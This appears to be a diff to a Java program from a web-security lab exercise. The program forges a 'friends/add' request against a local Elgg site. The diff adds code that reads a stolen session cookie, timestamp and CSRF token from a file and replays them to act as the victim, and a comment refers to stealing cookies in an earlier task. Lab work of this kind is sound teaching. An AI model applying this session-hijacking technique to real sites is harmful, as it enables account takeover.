@@ -4,11 +4,19 @@ public class HTTPSimpleForge {
 	public static void main(String[] args) throws IOException {
 		try {
 			int responseCode;
-			InputStream responseIn=null;
-			String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";
+			InputStream responseIn=null; 
+			File file = new File("HTTPSimpleForge.txt");
+			BufferedReader br = new BufferedReader(new FileReader(file));
+			String elgg_ts = br.readLine();
+			String elgg_token = br.readLine();
+			String cookie = br.readLine();
+ 
+            // Print the string
+			String requestDetails = "&__elgg_ts=" + elgg_ts + "&__elgg_token=" + elgg_token;
+			
 
 			// URL to be forged.
-			URL url = new URL ("http://localhost:8082/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
+			URL url = new URL ("http://localhost:8082/action/friends/add?friend=40"+requestDetails);
 
 			// URLConnection instance is created to further parameterize a
 			// resource request past what the state members of URL instance
@@ -24,6 +32,7 @@ public class HTTPSimpleForge {
 			// Add other necessary HTTP Headers yourself. Cookies should be stolen
 			// using the method in task3.
 			urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
+			urlConn.addRequestProperty("Cookie", cookie);
 
 			// HttpURLConnection a subclass of URLConnection is returned by
 			// url.openConnection() since the url is an http request.
